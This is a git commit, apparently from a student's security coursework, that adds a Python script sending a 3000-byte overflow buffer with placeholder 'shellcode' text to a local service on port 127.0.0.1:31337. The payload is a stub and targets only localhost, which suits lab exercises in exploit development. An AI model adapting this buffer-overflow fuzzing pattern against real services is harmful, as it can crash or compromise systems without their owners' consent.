7914f560205f252653d6e467738aabe3c0889255
Crissky <pg2006pe@hotmail.com>
2021-07-10 01:37:45 -0300

    1VA buffer overflow

---
+++ 1VA/Atividade-4/fuzzy.py
@@ -0,0 +1,31 @@
+import socket
+
+
+def send_buffer_overflow(my_buf):    
+    # Set up IP and PORT we1re connecting to
+    RHOST = '127.0.0.1'
+    RPORT = 31337
+
+    # Create a TCP connection (socket)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((RHOST, RPORT))
+
+    # Send the happy little message down the socket
+    s.send(my_buf)
+
+    # Print out what we sent
+    print( f'Sent: {my_buf}')
+
+    # Recive same data from the socket
+    data = s.recv(1024)
+
+    # Print out what we received
+    print(f'Received: {data}')
+
+
+# Build a happy little message folloewd by a newline
+buf = 'A'*3000 + 'IBP' + '\x90' + 'shellcode'
+buf += 'Python Script'
+buf += '\n'
+
+send_buffer_overflow(buf)
